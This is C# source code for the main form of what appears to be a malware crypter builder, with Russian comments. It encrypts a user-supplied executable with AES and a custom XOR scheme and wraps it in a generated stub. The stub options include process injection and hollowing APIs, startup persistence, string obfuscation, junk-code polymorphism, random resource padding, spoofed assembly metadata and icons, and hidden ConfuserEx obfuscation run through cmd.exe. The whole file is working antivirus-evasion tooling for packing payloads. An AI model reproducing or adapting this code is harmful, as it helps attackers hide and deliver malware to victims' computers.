using Microsoft.CSharp;
using System;
using System.CodeDom.Compiler;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Windows.Forms;
#pragma warning disable 0169
#pragma warning disable 0649

namespace WY_47_89
{
    public partial class Form1 : Form
    {
        static byte[] encFile;
        string ico;
        public static bool Dic0X=false;//включен ли словарь

        public Form1()
        {
            InitializeComponent();
        }

        void CleanAllLists()
        {
            StubBuilder.ListUniqueNames.Clear();
            StubBuilder.ListTriggersBase.Clear();
            StubBuilder.ListTriggersAssembly.Clear();
            StubBuilder.ListTriggersProcedure.Clear();
            StubBuilder.ListTriggersBetween.Clear();
            StubBuilder.ListTriggersTryCatch.Clear();
            StubBuilder.ListTriggersClass.Clear();
            StubBuilder.ListTriggersNamespace.Clear();
        }

        string AddEmptyStringTrain(bool bPlus)//добавим череду пустых строк
        {
            string rez = "";
            int lenght0 = StubBuilder.Instructions.GenerateRandomInt(6);

            for (int i = 0; i < lenght0; i++)
            {
                if ( i < lenght0 - 1 )
                {
                    rez = rez + "\"" + "\"" + " + ";
                }
                else
                {
                    rez = rez + "\"" + "\"" ;
                }
            }

            if ( bPlus == true && rez != "")
            {
                rez = rez + " + ";
            }

            return rez;
        }

        string ObfuscatedString(string basestring)//разбивка строки на буквы и ложные символы
        {
            bool rb;
            string rez = "";
            for (int i = 0; i < basestring.Length; i++)
            {
                rb = StubBuilder.Instructions.GenerateRandomBool();
                if ( rb == true )
                {
                    if ( i != basestring.Length - 1 )
                    {
                        rez = rez + "\"" + basestring[i] + "\"" + " + ";
                    }
                    else
                    {
                        rez = rez + "\"" + basestring[i] + "\"";
                    }
                }
                else
                {
                    if (i != basestring.Length - 1)
                    {
                        rez = rez + "\"" + basestring[i] + "\"" + " + " + AddEmptyStringTrain(true);
                    }
                    else
                    {
                        string strtemp0 = AddEmptyStringTrain(false);
                        if ( strtemp0 != "" )
                        {
                            rez = rez + "\"" + basestring[i] + "\"" + " + " + strtemp0;
                        }
                        else
                        {
                            rez = rez + "\"" + basestring[i] + "\"";
                        }
                    }
                }
            }

            //MessageBox.Show(rez);
            return rez;
            
        }

        void ReplaceAllStrings(ref string result0)
        {
            result0 = result0.Replace("%%%kernel32%%%", ObfuscatedString("kernel32"));
            result0 = result0.Replace("%%%ResumeThread%%%", ObfuscatedString("ResumeThread"));
            result0 = result0.Replace("%%%FlushInstructionCache%%%", ObfuscatedString("FlushInstructionCache"));
            result0 = result0.Replace("%%%VirtualProtectEx%%%", ObfuscatedString("VirtualProtectEx"));
            result0 = result0.Replace("%%%ReadProcessMemory%%%", ObfuscatedString("ReadProcessMemory"));
            result0 = result0.Replace("%%%WriteProcessMemory%%%", ObfuscatedString("WriteProcessMemory"));
            result0 = result0.Replace("%%%ntdll%%%", ObfuscatedString("ntdll"));
            result0 = result0.Replace("%%%NtUnmapViewOfSection%%%", ObfuscatedString("NtUnmapViewOfSection"));
            result0 = result0.Replace("%%%VirtualAllocEx%%%", ObfuscatedString("VirtualAllocEx"));
            result0 = result0.Replace("%%%IsWow64Process%%%", ObfuscatedString("IsWow64Process"));
            result0 = result0.Replace("%%%CreateProcessA%%%", ObfuscatedString("CreateProcessA"));
            result0 = result0.Replace("%%%NtQueryInformationProcess%%%", ObfuscatedString("NtQueryInformationProcess"));
            result0 = result0.Replace("%%%LoadLibraryA%%%", ObfuscatedString("LoadLibraryA"));
        }

        private static byte[] EncryptAES(byte[] bytesToBeEncrypted, string password)
        {
            byte[] result = null;
            using (MemoryStream memoryStream = new MemoryStream())
            {
                using (RijndaelManaged rijndaelManaged = new RijndaelManaged())
                {
                    rijndaelManaged.KeySize = 256;
                    rijndaelManaged.BlockSize = 128;
                    Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(Encoding.ASCII.GetBytes(password), Encoding.ASCII.GetBytes(password), 1000);
                    rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
                    rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
                    rijndaelManaged.Mode = CipherMode.CBC;
                    using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write))
                    {
                        cryptoStream.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
                        cryptoStream.Close();
                    }
                    result = memoryStream.ToArray();
                }
            }
            return result;
        }

        private static int RandomizeDeepMax = 3;//глубина фрактала рандома
        private static int RandomUpdateCycles = 1500;//цикличность рандома
        private static Random rnd = new Random();
        private static int CycleNum = rnd.Next(161, RandomUpdateCycles + 161);//вспомогательная переменная счетчик для функции рандома

        private static int RandomizeInt(int MinInt0, int MaxInt0, int RandomizeDeep0)//функция выбирающая произвольное целое число из диапазона
        {
            int rez;
            double psi;
            int ChozenInt;
            int BasicA = RandomUpdateCycles + 161;

            if (RandomizeDeep0 < RandomizeDeepMax)
            {
                ChozenInt = RandomizeInt(161, BasicA, RandomizeDeep0 + 1);
            }
            else
            {
                if (CycleNum < BasicA && CycleNum >= 161)
                {
                    CycleNum = CycleNum + 1;
                }
                if (CycleNum >= BasicA)
                {
                    CycleNum = 161;
                }
                ChozenInt = CycleNum;
            }


            psi = ((ChozenInt) * 1.412) * (MaxInt0 + 1 - MinInt0);
            rez = MinInt0 + (int)(Math.Abs((MaxInt0 + 1 - MinInt0) * (psi - Math.Truncate(psi))));
            return rez;
        }
        ///

        public static byte[] GenerateRandomByte()//генерация рандомного массива байт
        {
            int size = rnd.Next(1000, 1000000);
            byte[] gen = new byte[size];
            rnd.NextBytes(gen);
            return gen;
        }

        private const int MaxSizeCryptFractal=9;//максимальная глубина фрактала крипта
        private static int[] BytesDivider; //разделитель байтов на каждой новой ветке итерации
        private static int DeepFractal;//количество повторных криптовок
        private static string RandomName;

        private static byte[] EncryptUltimate(byte[] bytesToBeEncrypted, string password)//моя функция для криптовки(функция для расшифровки в стабе еще не присутствует)
        {
            byte[] result = bytesToBeEncrypted;
            byte[] maskP = Encoding.UTF8.GetBytes(password);//маска для кодирования
            byte[] subbyte = new byte[maskP.Length];//кусок байт для копирования первичных байт в буффер
            byte[] subbyteresult = new byte[maskP.Length];//кусок байт для помещения туда закодированного маской кода
            DeepFractal = RandomizeInt(3, MaxSizeCryptFractal, 3);//количество повторных криптовок
            BytesDivider=new int[MaxSizeCryptFractal];

            double MaskDividerEnd;//остаток от деления
            int MaskDividerFull;//полное число целых отрезков ( маска плюс разделитель )
            int MaskDividerResult;//результирующее число точек входа для наложения маски 
            int IteratorWhileMask;//итератор точек входа

            for (int i = 0; i < DeepFractal; ++i)
            {
                 if ( i != 0 )
                {
                    BytesDivider[i] = RandomizeInt(1, 20, 3);
                }
                else
                {
                    BytesDivider[i] = 0;
                }
                MaskDividerEnd = (double)(result.Length - BytesDivider[i]) % (double)(BytesDivider[i] + maskP.Length);
                MaskDividerFull = (int)((double)(result.Length- BytesDivider[i]) / (double)(BytesDivider[i] + maskP.Length));//сколько помещается отрезков (разделитель плюс маска) в криптуемом массиве , за вычетом начального разделителя
                if ( MaskDividerEnd != 0 )
                {
                    MaskDividerResult = MaskDividerFull;
                }
                else
                {
                    MaskDividerResult = MaskDividerFull-1;
                }

                IteratorWhileMask = 0;
                while ( IteratorWhileMask <= MaskDividerResult )
                {
                    int IndexStart = BytesDivider[i] + ((BytesDivider[i] + maskP.Length) * IteratorWhileMask);//индекс начала субстроки байт
                    int IndexEndPlusOne = BytesDivider[i] + ((BytesDivider[i] + maskP.Length) * IteratorWhileMask) + maskP.Length;//индекс конца субстроки байт плюс 1
                    if ( IndexStart >= result.Length )
                    {
                        break;
                    }
                    if ( IndexEndPlusOne > result.Length )
                    {
                        IndexEndPlusOne = result.Length;
                    }
                    for (int k = IndexStart; k < IndexEndPlusOne; ++k)
                    {
                        subbyte[k-IndexStart] = result[k];
                        subbyteresult[k- IndexStart] = (byte)(subbyte[k - IndexStart] ^ maskP[k - IndexStart]);
                    }
                    for (int k = IndexStart; k < IndexEndPlusOne; ++k)
                    {
                        result[k] = subbyteresult[k- IndexStart];
                    }
                    IteratorWhileMask++;
                }

            }
            
            return result;
        }

        private string BuildRevertedArray()
        {
            string rez = " { ";
            for (int i = 0; i < DeepFractal; ++i)
            {
                if ( i != DeepFractal-1)
                {
                    rez = rez + BytesDivider[DeepFractal - 1 - i].ToString() + " , ";
                }
                else
                {
                    rez = rez + BytesDivider[DeepFractal - 1 - i].ToString() + " } ";
                }
            }

            //MessageBox.Show(rez);
            return rez;
        }

        private static void PumpRes(ref CompilerParameters Params0, ref string[] ResArray,ref string sSumm)//генерация рандомных ресурсов
        {
            string sHelp="";
            Random rnd = new Random();
            byte[] gen;
            for (int i = 0; i < ResArray.Length ; ++i)
            {
                sHelp = StubBuilder.Instructions.GenerateRandomString();
                while ( StubBuilder.Instructions.IsSubInString(ref sSumm, ref sHelp) )
                {
                    sHelp = StubBuilder.Instructions.GenerateRandomString();
                }
                sSumm = sSumm + " " + sHelp;
                string filename = sHelp + ".bin";
                ResArray[i] = filename;
                Params0.EmbeddedResources.Add(ResArray[i]);
                int size = rnd.Next(50, 5000);
                gen = new byte[size];
                rnd.NextBytes(gen);
                File.WriteAllBytes(filename, gen);
            }
        }

        private static void DeleteResources(ref string[] ResArray, ref string[] ResArray0)//удаление файлов рандомных ресурсов
        {
            for (int i = 0; i < ResArray.Length; ++i)
            {
                File.Delete(ResArray[i]);
            }
            for (int i = 0; i < ResArray0.Length; ++i)
            {
                File.Delete(ResArray0[i]);
            }
        }

        private void ReplaceAdditionalAssembly(ref string rez0)//заполним в стаб информацию о сборке
        {
            rez0 = rez0.Replace("%%%RandomAssembly%%%", (!AssemblyPusher.Checked).ToString().ToLower());
            rez0 = rez0.Replace("%%%Title%%%", checkBox1.Checked.ToString().ToLower());
            rez0 = rez0.Replace("%%%AssemblyTitle%%%", textBox1.Text);
            rez0 = rez0.Replace("%%%Version%%%", checkBox2.Checked.ToString().ToLower());
            rez0 = rez0.Replace("%%%AssemblyVersion%%%", textBox2.Text);
            rez0 = rez0.Replace("%%%FileVersion%%%", checkBox3.Checked.ToString().ToLower());
            rez0 = rez0.Replace("%%%AssemblyFileVersion%%%", textBox3.Text);
            rez0 = rez0.Replace("%%%Description%%%", checkBox4.Checked.ToString().ToLower());
            rez0 = rez0.Replace("%%%AssemblyDescription%%%", textBox4.Text);
            rez0 = rez0.Replace("%%%Company%%%", checkBox5.Checked.ToString().ToLower());
            rez0 = rez0.Replace("%%%AssemblyCompany%%%", textBox5.Text);
            rez0 = rez0.Replace("%%%Product%%%", checkBox6.Checked.ToString().ToLower());
            rez0 = rez0.Replace("%%%AssemblyProduct%%%", textBox6.Text);
        }


        private void button3_Click(object sender, EventArgs e)
        {
            //Crypt и компиляция исходного файла
            Dic0X = DictionaryBox.Checked;
            string Xoption = "x86";
            if (BitBox.Text == "AMD64")
            {
                Xoption = "x64";
            }
            string SourceName = StubBuilder.Instructions.GenerateRandomString();//возьмем стандартное имя
            string src = "payload";
            string result = Properties.Resources.stub;
            result = result.Replace("%startup%", startup.Checked.ToString().ToLower());
            result = result.Replace("%native%", native.Checked.ToString().ToLower());
            result = result.Replace("%selfinj%", si.Checked.ToString().ToLower());
            result = result.Replace("%antivm%", false.ToString().ToLower());
            result = result.Replace("%key%", key.Text);
            result = result.Replace("%path%", ProcessBox.Text);

            var providerOptions = new Dictionary<string, string>
            {
                {"CompilerVersion", "v4.0"}
            };
            CompilerResults results;
            using (var provider = new CSharpCodeProvider(providerOptions))
            {
                var Params = new CompilerParameters(new[] { "mscorlib.dll", "System.Core.dll" }, Environment.GetEnvironmentVariable("temp") + "\\" + SourceName + ".exe", false);
                Params.CompilerOptions = "/t:winexe /unsafe /platform:" + Xoption;

                //Params.ReferencedAssemblies.Add("System.Core.dll");
                //Params.ReferencedAssemblies.Add("mscorlib.dll");

                Params.ReferencedAssemblies.Add("System.Windows.Forms.dll");
                Params.ReferencedAssemblies.Add("System.dll");
                Params.ReferencedAssemblies.Add("System.Drawing.Dll");
                Params.ReferencedAssemblies.Add("System.Security.Dll");
                Params.ReferencedAssemblies.Add("System.Management.dll");

                File.WriteAllBytes(src, EncryptAES(encFile, key.Text));

                Params.EmbeddedResources.Add(src);
                results = provider.CompileAssemblyFromSource(Params, result);

                String file = Environment.CurrentDirectory + "\\" + SourceName + ".exe";
                String temp = Environment.GetEnvironmentVariable("temp");

                foreach (CompilerError compilerError in results.Errors)
                {
                    if (compilerError.ErrorNumber != "CS0219")
                    {
                        MessageBox.Show(string.Format("Error: {0}, At line {1}", "MainStub Error  " + compilerError.ErrorText, compilerError.Line + " " + compilerError.ErrorNumber));
                    }
                        
                }

                if (false)
                {

                    File.WriteAllBytes(temp + "\\cli.exe", Properties.Resources.cli);
                    File.WriteAllBytes(temp + "\\Confuser.Core.dll", Properties.Resources.Confuser_Core);
                    File.WriteAllBytes(temp + "\\Confuser.DynCipher.dll", Properties.Resources.Confuser_DynCipher);
                    File.WriteAllBytes(temp + "\\Confuser.Protections.dll", Properties.Resources.Confuser_Protections);
                    File.WriteAllBytes(temp + "\\Confuser.Renamer.dll", Properties.Resources.Confuser_Renamer);
                    File.WriteAllBytes(temp + "\\Confuser.Runtime.dll", Properties.Resources.Confuser_Runtime);
                    File.WriteAllBytes(temp + "\\dnlib.dll", Properties.Resources.dnlib);

                    String crproj = Properties.Resources.def.Replace("%out%", Environment.CurrentDirectory);
                    crproj = crproj.Replace("%base%", temp);
                    crproj = crproj.Replace("%file%", temp + "\\" + SourceName + ".exe");
                    File.WriteAllText(temp + "\\def.crproj", crproj);

                    ProcessStartInfo startInfo = new ProcessStartInfo();
                    startInfo.Arguments = "/C " + temp + "\\cli.exe " + temp + "\\def.crproj";
                    startInfo.WindowStyle = ProcessWindowStyle.Hidden;
                    startInfo.CreateNoWindow = true;
                    startInfo.FileName = "cmd.exe";
                    Thread pr = new Thread(() => Process.Start(startInfo));
                    pr.Start();
                    pr.Join();
                    File.Delete(file);
                    File.Delete(src);
                }
                else
                {
                    try
                    {
                        File.Delete(file);
                        File.Delete(src);
                    }
                    catch (Exception)
                    {

                    }
                    File.Move(temp + "\\" + SourceName + ".exe", file);
                }

                
            }

            if (results.Errors.Count == 0)
            {
                //Crypt и компиляция стартового стаба и помещаем в ресурсы исходную сборку
                RandomName = StubBuilder.Instructions.GenerateRandomString();//придумаем рандомное имя
                string tmp = StubBuilder.Instructions.GenerateRandomString();
                string sourcepath = Environment.CurrentDirectory + "\\" + SourceName + ".exe";
                result = Properties.Resources.StubStarter;
                CleanAllLists();
                StubBuilder.ReplaceAllUniqueTriggersAssembly(ref result);//заполнение триггеров версий сборки
                StubBuilder.ModifyAllUniqueTriggersVoid(ref result);//заполнение всех триггеров генерации в процедурах
                StubBuilder.ModifyAllUniqueTriggersTryCatch(ref result);//заполнение всех триггеров генерации в блоках try catch
                StubBuilder.ReplaceAllUniqueTriggersBase(ref result);//заполнение всех триггеров замещения
                StubBuilder.ModifyAllUniqueTriggersBetween(ref result);//заполнение всех триггеров генерации между процедурами
                if (DeepPolyBox.Checked == true)
                {
                    StubBuilder.GenerateAdditionalTriggersEverywhere(ref result);//дополнительная автогенерация инструкций
                }
                StubBuilder.ModifyAllUniqueTriggersClass(ref result);//заполнение всех триггеров классов
                StubBuilder.ModifyAllUniqueTriggersNamespace(ref result);//заполнение триггеров пространств имен

                result = result.Replace("%key%", key.Text);
                result = result.Replace("%%%payload%%%", tmp);
                if ( AssemblyPusher.Checked == true )
                {
                    RandomName = textBox7.Text;
                }
                ReplaceAdditionalAssembly(ref result);
                //ReplaceAllStrings(ref result);
                using (var provider = new CSharpCodeProvider(providerOptions))
                {
                    var Params = new CompilerParameters(new[] { "mscorlib.dll", "System.Core.dll" }, Environment.GetEnvironmentVariable("temp") + "\\" + RandomName + ".exe", false);
                    if (ico != null)
                        Params.CompilerOptions = "/t:winexe /unsafe /platform:"+ Xoption + " /win32icon:\"" + ico + "\"";
                    else
                        Params.CompilerOptions = "/t:winexe /unsafe /platform:" + Xoption;

                    //Params.ReferencedAssemblies.Add("System.Core.dll");
                    //Params.ReferencedAssemblies.Add("mscorlib.dll");
                    Params.ReferencedAssemblies.Add("System.Windows.Forms.dll");
                    Params.ReferencedAssemblies.Add("System.dll");
                    Params.ReferencedAssemblies.Add("System.Drawing.Dll");
                    Params.ReferencedAssemblies.Add("System.Security.Dll");
                    Params.ReferencedAssemblies.Add("System.Management.dll");

                    string sSumm = tmp + " ";
                    string[] ResArray = new string[rnd.Next(1, 25)];
                    PumpRes(ref Params, ref ResArray, ref sSumm);//добавим рандомные ресурсы
                                                                 //File.WriteAllBytes(tmp, EncryptAES(encFile, key.Text));
                    File.WriteAllBytes(tmp, EncryptUltimate(File.ReadAllBytes(sourcepath), key.Text));
                    result = result.Replace("%%%arrayreverted%%%", BuildRevertedArray());

                    Params.EmbeddedResources.Add(tmp);
                    string[] ResArray0 = new string[rnd.Next(1, 25)];
                    PumpRes(ref Params, ref ResArray0, ref sSumm);//добавим рандомные ресурсы

                    results = provider.CompileAssemblyFromSource(Params, result);

                    try
                    {
                        File.Delete(tmp);
                        File.Delete(sourcepath);
                        DeleteResources(ref ResArray, ref ResArray0);
                    }
                    catch (Exception)
                    {

                    }

                    if (results.Errors.Count == 0)
                    {
                        String temp = Environment.GetEnvironmentVariable("temp");
                        if ( ObfBox.Checked == true )
                        {

                            File.WriteAllBytes(temp + "\\cli.exe", Properties.Resources.cli);
                            File.WriteAllBytes(temp + "\\Confuser.Core.dll", Properties.Resources.Confuser_Core);
                            File.WriteAllBytes(temp + "\\Confuser.DynCipher.dll", Properties.Resources.Confuser_DynCipher);
                            File.WriteAllBytes(temp + "\\Confuser.Protections.dll", Properties.Resources.Confuser_Protections);
                            File.WriteAllBytes(temp + "\\Confuser.Renamer.dll", Properties.Resources.Confuser_Renamer);
                            File.WriteAllBytes(temp + "\\Confuser.Runtime.dll", Properties.Resources.Confuser_Runtime);
                            File.WriteAllBytes(temp + "\\dnlib.dll", Properties.Resources.dnlib);

                            String crproj = Properties.Resources.def.Replace("%out%", Environment.CurrentDirectory);
                            crproj = crproj.Replace("%base%", temp);
                            crproj = crproj.Replace("%file%", temp + "\\" + RandomName + ".exe");
                            File.WriteAllText(temp + "\\def.crproj", crproj);

                            ProcessStartInfo startInfo = new ProcessStartInfo();
                            startInfo.Arguments = "/C " + temp + "\\cli.exe " + temp + "\\def.crproj";
                            startInfo.WindowStyle = ProcessWindowStyle.Hidden;
                            startInfo.CreateNoWindow = true;
                            startInfo.FileName = "cmd.exe";
                            Thread pr = new Thread(() => Process.Start(startInfo));
                            pr.Start();
                            pr.Join();
                        }
                        else
                        {
                            String file = Environment.CurrentDirectory + "\\" + RandomName + ".exe";
                            try
                            {
                                File.Delete(file);
                            }
                            catch (Exception)
                            {

                            }
                            File.Move(temp + "\\" + RandomName + ".exe", file);
                        }

                        MessageBox.Show("Done! Check " + RandomName + ".exe in the same folder.", "Crypting", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
                    }
                    foreach (CompilerError compilerError in results.Errors)
                    {
                        if ( compilerError.ErrorNumber != "CS0219" )
                        {
                            MessageBox.Show(string.Format("Error: {0}, At line {1}", "ShortStub Error  " + compilerError.ErrorText, compilerError.Line + " " + compilerError.ErrorNumber));
                        }
                        
                    }

                }

            }

            foreach (CompilerError compilerError in results.Errors)
            {
                if (compilerError.ErrorNumber != "CS0219")
                {
                    MessageBox.Show(string.Format("Error: {0}, At line {1}", "ShortStub Error  " + compilerError.ErrorText, compilerError.Line + " " + compilerError.ErrorNumber));
                }
            }

        }


        private void button2_Click(object sender, EventArgs e)
        {
            //choose file
            int size = -1;
            DialogResult result = openFileDialog1.ShowDialog(); 
            if (result == DialogResult.OK) 
            {
                string file = openFileDialog1.FileName;
                try
                {
                    byte[] bytes = File.ReadAllBytes(file);
                    size = bytes.Length;
                    encFile = bytes;
                    fpath.Text = file;
                }
                catch (IOException exc)
                {
                    MessageBox.Show(exc.ToString());
                }
            }
        }

        public string GenerateKey()
        {
            string abc = "QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm1234567890";
            string result = "";
            Random rnd = new Random();
            int iter = rnd.Next(5, abc.Length);
            for (int i = 0; i < iter; i++)
                result += abc[rnd.Next(0, abc.Length)];
            return result;
        }

        private void button1_Click(object sender, EventArgs e)
        {
            //generate key            
            key.Text = GenerateKey();
        }

        private void checkBox3_CheckedChanged(object sender, EventArgs e)
        {
            //startup
        }

        private void checkBox4_CheckedChanged(object sender, EventArgs e)
        {
            //obfuscate
        }

        private void checkBox5_CheckedChanged(object sender, EventArgs e)
        {
            //pump
        }

        private void checkBox6_CheckedChanged(object sender, EventArgs e)
        {
            //anti vm
        }

        private void checkBox2_CheckedChanged(object sender, EventArgs e)
        {
            //native
             managed.Checked = !native.Checked;
        }

        private void checkBox1_CheckedChanged(object sender, EventArgs e)
        {
            //process injection
            si.Checked = !pi.Checked;
        }

        private void checkBox1_CheckedChanged_1(object sender, EventArgs e)
        {
            //Managed
            native.Checked = !managed.Checked;
            pi.Checked = false;
        }

        private void si_CheckedChanged(object sender, EventArgs e)
        {
            //self inj
            pi.Checked = !si.Checked;
        }

        private void button3_Click_1(object sender, EventArgs e)
        {
            //icon
            DialogResult result = openFileDialog1.ShowDialog();
            if (result == DialogResult.OK)
            {
                ico = openFileDialog1.FileName;
                icopath.Text = ico;
            }
                
            else
                MessageBox.Show("Error. Choose another icon.");
        }

        private void textBox2_TextChanged(object sender, EventArgs e)
        {

        }

        private void Form1_Load(object sender, EventArgs e)
        {
            pi.Enabled = true;
            FreeVoidEnableDisable(AssemblyPusher.Checked);
        }

        private void FreeVoidEnableDisable( bool bAction )//включение / выключение ручной настройки выходной сборки
        {
            if ( bAction == true)
            {
                checkBox1.Enabled = true;
                checkBox2.Enabled = true;
                checkBox3.Enabled = true;
                checkBox4.Enabled = true;
                checkBox5.Enabled = true;
                checkBox6.Enabled = true;

                textBox6.Enabled = true;
                textBox5.Enabled = true;
                textBox4.Enabled = true;
                textBox3.Enabled = true;
                textBox2.Enabled = true;
                textBox1.Enabled = true;
                textBox7.Enabled = true;
            }
            else
            {
                checkBox1.Enabled = false;
                checkBox2.Enabled = false;
                checkBox3.Enabled = false;
                checkBox4.Enabled = false;
                checkBox5.Enabled = false;
                checkBox6.Enabled = false;

                textBox6.Enabled = false;
                textBox5.Enabled = false;
                textBox4.Enabled = false;
                textBox3.Enabled = false;
                textBox2.Enabled = false;
                textBox1.Enabled = false;
                textBox7.Enabled = false;
            }
        }

        private void openFileDialog1_FileOk(object sender, CancelEventArgs e)
        {

        }

        private void pictureBox1_Click(object sender, EventArgs e)
        {

        }

        private void pictureBox1_Click_1(object sender, EventArgs e)
        {

        }

        private void label3_Click(object sender, EventArgs e)
        {

        }

        private void textBox2_TextChanged_1(object sender, EventArgs e)
        {

        }

        private void label11_Click(object sender, EventArgs e)
        {

        }

        private void EnableUserAssembly(object sender, EventArgs e)//когда меняется чекер информации о сборке ( мое )
        {
            FreeVoidEnableDisable(AssemblyPusher.Checked);
        }

        private void label9_Click(object sender, EventArgs e)
        {

        }
    }
}
